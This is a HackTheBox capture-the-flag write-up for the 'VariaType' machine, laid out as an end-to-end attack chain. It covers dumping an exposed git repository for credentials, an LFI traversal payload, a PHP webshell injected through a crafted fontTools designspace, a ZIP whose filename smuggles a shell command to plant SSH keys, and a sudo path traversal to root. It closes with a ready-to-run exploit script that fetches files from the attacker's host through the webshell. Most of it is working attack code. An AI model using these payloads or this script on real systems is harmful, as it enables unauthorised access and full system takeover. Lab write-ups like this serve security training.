# VariaType (Avatar) - HackTheBox CTF Writeup

**Target IP:** <Tareget_IP>  
**Difficulty:** Medium  
**Flags:**
- user.txt: `<REDACTED_USER_FLAG>`
- root.txt: `<REDACTED_ROOT_FLAG>`

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Initial Access - Git Repo & LFI](#initial-access)
3. [RCE via CVE-2025-66034](#rce)
4. [Privilege Escalation to steve](#privesc-steve)
5. [Privilege Escalation to root](#privesc-root)
6. [Full Automation Script](#automation)

---

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oN nmap.txt <Tareget_IP>
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.22.1
```

### Host Discovery
```bash
# Add to /etc/hosts
echo "<Tareget_IP> variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
```

### Git Repository Exposure
The portal subdomain has an exposed `.git` directory:
```bash
curl -s http://portal.variatype.htb/.git/HEAD
# Output: ref: refs/heads/master
```

---

## Initial Access

### Step 1: Dump Git Repository
```bash
# Install git-dumper
pip3 install git-dumper --break-system-packages

# Dump the repo
git-dumper http://portal.variatype.htb/.git git-repo
cd git-repo
```

### Step 2: Extract Credentials from Git History
```bash
# Check git log
git log --oneline --all

# Find unreachable commits with credentials
git fsck --no-reflog --full --unreachable | grep commit

# Show the commit with credentials
git show 6f021da6be7086f2595befaa025a83d1de99478b
```

**Credentials Found:**
```
Username: gitbot
Password: G1tB0t_Acc3ss_2025!
```

### Step 3: Login and Test LFI
```bash
# Login and save cookie
curl -s -X POST http://portal.variatype.htb/ \
  -d "username=gitbot" \
  -d "password=G1tB0t_Acc3ss_2025!" \
  -c cookies.txt -L

# Test LFI on /etc/passwd
export PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $7}')
curl -s -b "PHPSESSID=$PHPSESSID" \
  "http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//etc/passwd"
```

---

## RCE via CVE-2025-66034

### Vulnerability Details
- **CVE:** CVE-2025-66034
- **Type:** Arbitrary File Write + XML Injection in fontTools.varLib
- **Affected:** fontTools versions 4.33.0 to 4.60.2

### Step 4: Create Malicious Font Files

**Script: `make_fonts.py`**
```python
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_font(filename, weight=400):
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    pen = TTGlyphPen(None)
    pen.moveTo((0,0))
    pen.lineTo((500,0))
    pen.lineTo((500,500))
    pen.lineTo((0,500))
    pen.closePath()
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName":"Test","styleName":"W"})
    fb.save(filename)

create_font("source-light.ttf", 100)
create_font("source-regular.ttf", 400)
print("[+] Generated source-light.ttf and source-regular.ttf")
```

Run:
```bash
python3 make_fonts.py
```

### Step 5: Create Malicious Designspace

**File: `malicious.designspace`**
```xml
<designspace format="5.0">
<axes>
<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
<labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]></labelname>
</axis>
</axes>

<sources>
<source filename="source-light.ttf" name="Light">
<location><dimension name="Weight" xvalue="100"/></location>
</source>
<source filename="source-regular.ttf" name="Regular">
<location><dimension name="Weight" xvalue="400"/></location>
</source>
</sources>

<variable-fonts>
<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
<axis-subsets><axis-subset name="Weight"/></axis-subsets>
</variable-font>
</variable-fonts>
</designspace>
```

### Step 6: Upload and Execute

```bash
# Upload to variatype.htb processor
curl -s -X POST "http://variatype.htb/tools/variable-font-generator/process" \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf"

# Test webshell
curl -s -b "PHPSESSID=$PHPSESSID" \
  "http://portal.variatype.htb/files/shell.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Privilege Escalation to steve

### Step 7: Generate SSH Key for steve
```bash
ssh-keygen -t ed25519 -f steve_key -N "" -C "steve@pwn"
# Public key: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINgrO8KNJoyQAVGH8j0SXVo1ttnRnHJmhkC3vTa8ipdU steve@pwn
```

### Step 8: Create Evil ZIP (CVE-2024-25082)

**Script: `make_evil_zip.py`**
```python
import zipfile

pub = open("steve_key.pub","r").read().strip()

# Payload in filename - executed by FontForge cron job
payload = f'x$(mkdir -p /home/steve/.ssh && echo "{pub}" >> /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys).ttf'

with zipfile.ZipFile("evil.zip","w") as z:
    z.writestr(payload, b"\x00"*100)

print("[+] evil.zip created")
print(f"Payload filename: {payload[:60]}...")
```

Run:
```bash
python3 make_evil_zip.py
```

### Step 9: Upload and Wait for Cron
```bash
# Start HTTP server
python3 -m http.server 8888 &

# Download to target via webshell
curl -s "http://portal.variatype.htb/files/shell.php?cmd=wget%20http://<Your_IP_Address>:8888/evil.zip%20-O%20/var/www/portal.variatype.htb/public/files/evil.zip"

# Wait 60 seconds for cron to process
echo "Waiting for cron..."
sleep 60

# SSH as steve
ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "whoami && cat ~/user.txt"
```

**user.txt:** `<REDACTED_USER_FLAG>`

---

## Privilege Escalation to root

### Step 10: Check Sudo Permissions
```bash
ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> "sudo -l"
```

**Output:**
```
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

### Step 11: Exploit Path Traversal in install_validator.py

Generate root SSH key:
```bash
ssh-keygen -t ed25519 -f root_key -N "" -C "root@pwn"
```

Create HTTP server to serve key:
```python
# serve_root_key.py
from http.server import HTTPServer, BaseHTTPRequestHandler

data = open("root_key.pub","rb").read()

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, format, *args):
        pass

HTTPServer(("0.0.0.0", 8889), H).serve_forever()
```

Run exploit:
```bash
# Start server
python3 serve_root_key.py &

# Exploit with URL-encoded absolute path
ssh -o StrictHostKeyChecking=no -i steve_key steve@<Tareget_IP> \
  "sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://<Your_IP_Address>:8889/%2Froot%2F.ssh%2Fauthorized_keys'"
```

**Output:**
```
[INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

### Step 12: SSH as root
```bash
ssh -o StrictHostKeyChecking=no -i root_key root@<Tareget_IP> "whoami && cat /root/root.txt"
```

**root.txt:** `<REDACTED_ROOT_FLAG>`

---

## Full Automation Script

**`exploit.sh`** - Complete automated exploitation:

```bash
#!/bin/bash

# VariaType (Avatar) - HackTheBox Auto-Exploit
# Target: <Tareget_IP>

set -e

RHOST="<Tareget_IP>"
LHOST="<Your_IP_Address>"

echo "[*] VariaType Auto-Exploit"
echo "[*] Target: $RHOST"
echo "[*] Attacker: $LHOST"

# Setup hosts
echo "[*] Setting up /etc/hosts..."
echo "$RHOST variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts

# Install git-dumper
echo "[*] Installing git-dumper..."
pip3 install git-dumper --break-system-packages 2>/dev/null || true

# Dump git repo
echo "[*] Dumping git repository..."
rm -rf git-repo 2>/dev/null || true
git-dumper http://portal.variatype.htb/.git git-repo
cd git-repo

# Get credentials from git history
echo "[*] Extracting credentials..."
git show 6f021da6be7086f2595befaa025a83d1de99478b | grep -A2 "USERS ="
cd ..

# Login and get cookie
echo "[*] Logging in to portal..."
curl -s -X POST http://portal.variatype.htb/ \
  -d "username=gitbot" \
  -d "password=G1tB0t_Acc3ss_2025!" \
  -c cookies.txt -L
export PHPSESSID=$(grep PHPSESSID cookies.txt | awk '{print $7}')

# Test LFI
echo "[*] Testing LFI..."
curl -s -b "PHPSESSID=$PHPSESSID" \
  "http://portal.variatype.htb/download.php?f=....//....//....//etc/passwd" | head -5

# Create fonts
echo "[*] Creating malicious fonts..."
cat > make_fonts.py << 'PY'
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_font(filename, weight=400):
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    pen = TTGlyphPen(None)
    pen.moveTo((0,0)); pen.lineTo((500,0)); pen.lineTo((500,500)); pen.lineTo((0,500)); pen.closePath()
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName":"Test","styleName":"W"})
    fb.save(filename)

create_font("source-light.ttf", 100)
create_font("source-regular.ttf", 400)
PY
python3 make_fonts.py

# Create designspace
echo "[*] Creating malicious designspace..."
cat > malicious.designspace << 'XML'
<designspace format="5.0">
<axes>
<axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
<labelname xml:lang="en"><![CDATA[<?php system($_GET["cmd"]); ?>]]></labelname>
</axis>
</axes>
<sources>
<source filename="source-light.ttf" name="Light">
<location><dimension name="Weight" xvalue="100"/></location>
</source>
<source filename="source-regular.ttf" name="Regular">
<location><dimension name="Weight" xvalue="400"/></location>
</source>
</sources>
<variable-fonts>
<variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/shell.php">
<axis-subsets><axis-subset name="Weight"/></axis-subsets>
</variable-font>
</variable-fonts>
</designspace>
XML

# Upload webshell
echo "[*] Uploading webshell..."
curl -s -X POST "http://variatype.htb/tools/variable-font-generator/process" \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf" > /dev/null

# Test webshell
echo "[*] Testing webshell..."
curl -s "http://portal.variatype.htb/files/shell.php?cmd=whoami"

# Generate SSH keys
echo "[*] Generating SSH keys..."
ssh-keygen -t ed25519 -f steve_key -N "" -C "steve@pwn"
ssh-keygen -t ed25519 -f root_key -N "" -C "root@pwn"

# Create evil ZIP
echo "[*] Creating evil ZIP..."
cat > make_evil_zip.py << 'PY'
import zipfile
pub = open("steve_key.pub","r").read().strip()
payload = f'x$(mkdir -p /home/steve/.ssh && echo "{pub}" >> /home/steve/.ssh/authorized_keys && chmod 700 /home/steve/.ssh && chmod 600 /home/steve/.ssh/authorized_keys).ttf'
with zipfile.ZipFile("evil.zip","w") as z:
    z.writestr(payload, b"\x00"*100)
PY
python3 make_evil_zip.py

# Upload evil ZIP
python3 -m http.server 8888 &
HTTP_PID=$!
sleep 2
curl -s "http://portal.variatype.htb/files/shell.php?cmd=wget%20http://$LHOST:8888/evil.zip%20-O%20/var/www/portal.variatype.htb/public/files/evil.zip"

echo "[*] Waiting 60s for cron..."
sleep 60

# Get user flag
echo "[*] Getting user flag..."
ssh -o StrictHostKeyChecking=no -i steve_key steve@$RHOST "cat ~/user.txt"

# Exploit root
echo "[*] Creating root key server..."
cat > serve_root_key.py << 'PY'
from http.server import HTTPServer, BaseHTTPRequestHandler
data = open("root_key.pub","rb").read()
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, format, *args):
        pass
HTTPServer(("0.0.0.0", 8889), H).serve_forever()
PY
python3 serve_root_key.py &
sleep 2

echo "[*] Exploiting root..."
ssh -o StrictHostKeyChecking=no -i steve_key steve@$RHOST \
  "sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://$LHOST:8889/%2Froot%2F.ssh%2Fauthorized_keys'"

# Get root flag
echo "[*] Getting root flag..."
ssh -o StrictHostKeyChecking=no -i root_key root@$RHOST "cat /root/root.txt"

echo "[*] Done!"
```

---

## Key Vulnerabilities Used

| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2025-66034 | fontTools varLib arbitrary file write + XML injection | RCE as www-data |
| CVE-2024-25082 | FontForge ZIP filename command injection | Privilege escalation to steve |
| Path Traversal | install_validator.py URL-encoded absolute path | Privilege escalation to root |

---

## Lessons Learned

1. **Exposed .git directories** are still a common vulnerability - always check
2. **Git history** often contains hardcoded credentials in removed commits
3. **CVE-2025-66034** combines path traversal with XML injection for powerful exploitation
4. **Cron jobs** with unsafe filename handling are common privilege escalation vectors
5. **URL-encoded absolute paths** (`%2Froot%2F.ssh`) can bypass path validation

---
For educational purposes only*
